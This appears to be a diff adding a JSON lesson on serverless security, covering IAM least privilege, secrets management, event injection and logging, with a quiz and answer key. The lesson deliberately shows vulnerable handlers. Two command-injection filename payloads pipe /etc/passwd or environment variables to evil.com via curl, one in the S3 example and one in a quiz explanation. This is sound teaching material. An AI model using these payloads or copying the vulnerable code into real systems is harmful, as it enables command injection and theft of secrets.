@@ -1,0 +1,119 @@
+{
+  "lesson_id": "b8c9d0e1-f2a3-4b4c-5d6e-7f8a9b0c1d2e",
+  "domain": "cloud",
+  "title": "Serverless Security (Lambda, Azure Functions)",
+  "difficulty": 2,
+  "order_index": 54,
+  "prerequisites": ["Cloud Security Fundamentals: AWS/Azure/GCP"],
+  "concepts": ["serverless architecture", "Lambda security", "Azure Functions", "function permissions", "event injection", "cold start attacks", "secrets management"],
+  "estimated_time": 50,
+  "learning_objectives": [
+    "Understand serverless architecture and its unique security model",
+    "Apply least privilege to serverless function execution roles",
+    "Secure secrets and environment variables in serverless functions",
+    "Identify event injection attack vectors",
+    "Integrate runtime monitoring and logging for serverless"
+  ],
+  "tags": ["serverless", "lambda", "azure-functions", "cloud-security", "Career Path: Cloud Security Specialist"],
+  "jim_kwik_principles": [
+    "Start with why: Serverless is the fastest-growing cloud pattern — security must keep pace",
+    "FAST: Serverless has no servers to patch but plenty of code to secure",
+    "Active recall: After reading, list 5 serverless-specific security risks",
+    "Spaced repetition: Review IAM role permissions for serverless weekly",
+    "Teach it: Explain to a developer why Environment Variables are not secret",
+    "State: Think of each Lambda as a microservice with its own trust boundary",
+    "Visualization: Picture Lambda functions as contractors — they should only access what they need for the job",
+    "Association: Over-permissioned Lambda = contractor with master key to the building",
+    "Pattern recognition: Most serverless vulns are IAM + secrets management failures",
+    "Growth: Serverless security certifications are emerging — early movers win"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "Serverless: The Perimeter Is Gone",
+      "content": "In serverless, there's no server to firewall, no OS to patch, no VM to harden. The security model shifts entirely to: IAM roles, code quality, secrets management, and event validation. Traditional security thinking doesn't fully apply. If you're securing serverless functions the same way you secure EC2 instances, you're missing most of the attack surface."
+    },
+    {
+      "type": "explanation",
+      "title": "Serverless Architecture and Security Model",
+      "content": "**What is serverless?**\nFunctions-as-a-Service (FaaS) — you write code, the provider runs it on demand. No infrastructure management. Key platforms:\n- **AWS Lambda** — most mature, triggered by 200+ event sources\n- **Azure Functions** — integrated with Microsoft ecosystem\n- **Google Cloud Functions / Cloud Run** — GCP's offerings\n\n**Security model differences from traditional:**\n| Traditional | Serverless |\n|-------------|------------|\n| OS-level access | No OS access |\n| Long-running processes | Ephemeral execution |\n| Network-based perimeter | IAM-based access control |\n| Manual patching | Provider-managed runtime |\n| Server hardening | Function code quality |\n\n**Unique attack surface:**\n1. **IAM execution roles** — what can the function access?\n2. **Event injection** — untrusted data from event sources\n3. **Secrets in environment variables** — visible in AWS console\n4. **Dependency supply chain** — packages in the function package\n5. **Cold start timing** — information leakage via timing\n6. **Function URL / API Gateway** — unauthenticated access"
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: Serverless Security",
+      "content": "Imagine you run a mail sorting business. Instead of full-time employees (servers), you hire contractors (functions) each time there's mail to sort.\n\nEach contractor comes in, does their specific job, and leaves. You give them a badge (IAM role) that only opens the mail room — not the executive floor, not the server room.\n\nBut here's where it goes wrong:\n- Some contractors are given master keys (over-permissive IAM roles)\n- Some write their passwords on sticky notes in the mail room (env vars)\n- Sometimes a sneaky letter arrives with instructions that trick the contractor into doing something unauthorized (event injection)\n\nServerless security is about controlling exactly what each contractor can do and access."
+    },
+    {
+      "type": "code_exercise",
+      "title": "Least Privilege IAM for Lambda",
+      "content": "**The Problem: Over-permissive Lambda Role:**\n```json\n// BAD: Lambda can do EVERYTHING\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Action\": \"*\",\n    \"Resource\": \"*\"\n  }]\n}\n```\n\n**The Fix: Least privilege role:**\n```json\n// GOOD: Lambda can only read from one specific S3 bucket\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\"],\n      \"Resource\": \"arn:aws:s3:::my-specific-bucket/input/*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"dynamodb:PutItem\"],\n      \"Resource\": \"arn:aws:dynamodb:us-east-1:123456:table/ProcessedItems\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"logs:CreateLogGroup\", \"logs:CreateLogStream\", \"logs:PutLogEvents\"],\n      \"Resource\": \"arn:aws:logs:*:*:*\"\n    }\n  ]\n}\n```\n\n**AWS IAM Access Analyzer:**\n```bash\n# Find over-permissive Lambda roles\naws iam list-roles --query 'Roles[?contains(RoleName, `lambda`)]'\naws iam get-role-policy --role-name MyLambdaRole --policy-name MyPolicy\n\n# Check what a role actually accesses (Access Advisor)\naws iam generate-service-last-accessed-details --arn arn:aws:iam::123456:role/MyLambdaRole\n```"
+    },
+    {
+      "type": "explanation",
+      "title": "Secrets Management: Don't Use Environment Variables",
+      "content": "**The Problem:**\nDevelopers commonly put secrets in Lambda environment variables:\n```python\nimport os\nDB_PASSWORD = os.environ['DB_PASSWORD']  # BAD - visible in AWS console!\nAPI_KEY = os.environ['STRIPE_KEY']       # BAD - logged if printed!\n```\n\nEnvironment variables in Lambda are:\n- Visible to anyone with AWS console access to the function\n- Appear in Lambda configuration exports\n- Potentially logged if accidentally printed\n- Decrypted at function start (even without your code running)\n\n**The Fix: Use AWS Secrets Manager or Parameter Store:**\n```python\nimport boto3\nimport json\n\ndef get_secret(secret_name):\n    client = boto3.client('secretsmanager')\n    response = client.get_secret_value(SecretId=secret_name)\n    return json.loads(response['SecretString'])\n\ndef handler(event, context):\n    # Fetch secret at runtime (cache in /tmp for warm executions)\n    secrets = get_secret('prod/myapp/database')\n    db_password = secrets['password']\n    # ... use password, don't log it\n```\n\n**Encryption of env vars (minimum):**\n- Use Lambda KMS encryption for env vars\n- Create a custom KMS key, not the default\n- Rotate secrets regularly via Secrets Manager rotation"
+    },
+    {
+      "type": "code_exercise",
+      "title": "Event Injection: Serverless's SQL Injection",
+      "content": "Lambda functions receive events from various sources. Untrusted event data must be validated:\n\n**Event Injection via API Gateway:**\n```python\n# VULNERABLE: Direct SQL construction from event data\ndef handler(event, context):\n    user_id = event['queryStringParameters']['user_id']\n    query = f\"SELECT * FROM users WHERE id = {user_id}\"\n    # Attacker sends: ?user_id=1 OR 1=1 → SQL Injection!\n```\n\n**Injection via S3 Event (filename injection):**\n```python\n# VULNERABLE: OS command from S3 key name\ndef handler(event, context):\n    key = event['Records'][0]['s3']['object']['key']\n    os.system(f\"convert {key} output.png\")  # Command injection!\n    # Attacker uploads file named: 'img.jpg; curl http://evil.com/steal?data=$(cat /etc/passwd)'\n```\n\n**FIXED: Input validation:**\n```python\nimport re\n\ndef handler(event, context):\n    user_id = event.get('queryStringParameters', {}).get('user_id', '')\n    \n    # Validate: must be a positive integer\n    if not re.match(r'^\\d+$', user_id):\n        return {'statusCode': 400, 'body': 'Invalid user_id'}\n    \n    user_id = int(user_id)\n    \n    # Use parameterized query\n    cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n\ndef safe_s3_handler(event, context):\n    key = event['Records'][0]['s3']['object']['key']\n    \n    # Validate key format\n    if not re.match(r'^[a-zA-Z0-9._-]+$', key):\n        raise ValueError(f\"Invalid key name: {key}\")\n    \n    # Use parameterized subprocess, not shell=True\n    subprocess.run(['convert', key, 'output.png'], shell=False, timeout=30)\n```"
+    },
+    {
+      "type": "explanation",
+      "title": "Serverless Logging and Monitoring",
+      "content": "**What to log:**\n- Function invocations (who/what triggered)\n- External API calls made\n- Data accessed (table/bucket names, not values)\n- Errors and exceptions\n- Execution time (anomalies indicate issues)\n\n**What NOT to log:**\n- Credentials, tokens, API keys\n- PII (names, emails, SSNs)\n- Full request/response bodies (may contain sensitive data)\n\n**AWS CloudWatch for Lambda:**\n```python\nimport logging\nimport json\n\nlogger = logging.getLogger()\nlogger.setLevel(logging.INFO)\n\ndef handler(event, context):\n    # Log sanitized event data\n    logger.info(json.dumps({\n        'event_source': event.get('source', 'unknown'),\n        'request_id': context.aws_request_id,\n        'remaining_ms': context.get_remaining_time_in_millis()\n    }))\n    \n    # DON'T log: event parameters that might contain user data\n    # DON'T log: any credentials even if encrypted\n```\n\n**AWS Lambda Insights (X-Ray):**\n```python\nfrom aws_xray_sdk.core import xray_recorder\n\n@xray_recorder.capture('process_payment')\ndef process_payment(amount, currency):\n    # X-Ray traces this function call automatically\n    # Useful for: latency tracking, dependency mapping, anomaly detection\n    pass\n```"
+    },
+    {
+      "type": "real_world",
+      "title": "Real Serverless Security Incidents",
+      "content": "**Capital One Data Breach (2019):** A misconfigured WAF allowed SSRF attacks that could reach EC2 instance metadata. The EC2 instance had an overly-permissive IAM role, allowing access to 100 million credit card applications in S3. While not Lambda-specific, the IAM lesson applies directly to serverless.\n\n**Lambda Cryptojacking (2020):** Attackers who compromised AWS accounts via leaked credentials found Lambda execution roles with excessive permissions. They deployed Lambda functions to mine cryptocurrency — extremely cheap for the attacker, expensive for the account owner.\n\n**Dependency Supply Chain (2021):** Malicious npm packages targeting serverless functions injected code that exfiltrated environment variables (including secrets) to external servers during function execution."
+    },
+    {
+      "type": "memory_aid",
+      "title": "Serverless Security: SLICE",
+      "content": "**S** — Secrets: Use Secrets Manager, never plain env vars\n**L** — Least Privilege: IAM roles scoped to exactly what the function needs\n**I** — Input Validation: Every event source is untrusted — validate everything\n**C** — CloudWatch: Log behavior, not data; monitor anomalies\n**E** — Exposure: Check function URLs, API Gateway auth, VPC isolation\n\nFor each Lambda/Function:\n1. What IAM permissions does the execution role have?\n2. Where are secrets stored?\n3. What event sources trigger it — are they validated?\n4. Is logging configured without sensitive data?\n5. Is the function publicly accessible? Should it be?"
+    },
+    {
+      "type": "reflection",
+      "title": "Serverless Security Review",
+      "content": "Review this Lambda function configuration:\n```python\nimport os\nimport boto3\nimport subprocess\n\ndef handler(event, context):\n    filename = event['filename']\n    api_key = os.environ['PAYMENT_API_KEY']\n    \n    # Process file\n    os.system(f\"process_file.sh {filename}\")\n    \n    # Make payment\n    result = make_payment(api_key, event['amount'])\n    print(f\"Payment result: {result}\")\n    return result\n```\n\nThe Lambda role has `s3:*` and `dynamodb:*` permissions.\n\n**Find 4 security issues:**\n1. Command injection: `filename` from event directly in `os.system()` — inject commands via filename\n2. Secret in env var: `PAYMENT_API_KEY` visible in Lambda console, potentially logged\n3. Over-permissive IAM: `s3:*` and `dynamodb:*` — should be specific resources and actions\n4. Sensitive data in logs: `print(f\"Payment result: {result}\")` might log payment details to CloudWatch"
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Serverless Security Is Code Security",
+      "content": "The provider secures the infrastructure. You secure the code, the IAM roles, and the secrets. This is actually liberating — no patch Tuesday, no OS hardening, no network segmentation headaches. Focus on: what can your function access (IAM), what data does it handle (secrets + logging), and what inputs does it trust (event validation). Get these three right, and serverless can be more secure than traditional infrastructure."
+    }
+  ],
+  "post_assessment": [
+    {
+      "question": "Why are Lambda environment variables considered insecure for storing API keys?",
+      "options": ["They are automatically deleted after each function invocation", "They are visible in the AWS console to anyone with Lambda permissions and can appear in logs", "They are only accessible outside the function code", "They don't support string values"],
+      "correct": 1,
+      "explanation": "Lambda environment variables are visible to anyone with IAM access to view the Lambda function configuration. They can also be accidentally logged if code prints them, and they appear in function configuration exports. AWS Secrets Manager or Parameter Store are the correct alternatives."
+    },
+    {
+      "question": "A Lambda function receives a filename from an S3 event and runs `os.system(f'convert {filename} output.png')`. What vulnerability exists?",
+      "options": ["SQL Injection", "Command Injection via event data", "Path Traversal", "Buffer Overflow"],
+      "correct": 1,
+      "explanation": "Using event data (filename from S3) directly in os.system() with string interpolation enables command injection. An attacker-controlled filename like 'img.jpg; curl http://evil.com/?data=$(env)' would exfiltrate environment variables. Use subprocess.run() with a list argument and shell=False instead."
+    },
+    {
+      "question": "What is the principle of least privilege for Lambda execution roles?",
+      "options": ["All Lambda functions should share one powerful role", "Each Lambda function should have a role with only the permissions needed for its specific tasks", "Lambda functions should use root credentials for simplicity", "Execution roles should be changed weekly for security"],
+      "correct": 1,
+      "explanation": "Each Lambda function should have a dedicated execution role with only the minimum permissions needed (specific S3 buckets, specific DynamoDB tables, specific actions). If a function is compromised, blast radius is limited to what that role can access."
+    },
+    {
+      "question": "Which service should be used to securely store database passwords for Lambda functions?",
+      "options": ["Lambda environment variables", "S3 bucket object", "AWS Secrets Manager or Parameter Store (SecureString)", "CloudWatch Logs"],
+      "correct": 2,
+      "explanation": "AWS Secrets Manager provides encrypted secret storage with automatic rotation. Lambda functions retrieve secrets at runtime via API calls. This keeps secrets out of function configuration, reduces exposure window, and enables rotation without redeployment."
+    },
+    {
+      "question": "A Lambda function with Action: '*' Resource: '*' IAM policy gets compromised. What's the worst-case scenario?",
+      "options": ["The attacker can only delete the Lambda function", "The attacker has full AWS account access — read/write/delete all services and resources", "The attacker can only affect resources in the same region", "The attacker can only access resources created by the same Lambda function"],
+      "correct": 1,
+      "explanation": "Action: '*' Resource: '*' grants full AWS administrative access. A compromised Lambda with this role gives an attacker complete control over the AWS account — exfiltrate all S3 data, delete infrastructure, create backdoor IAM users, access all databases, and more."
+    }
+  ]
+}
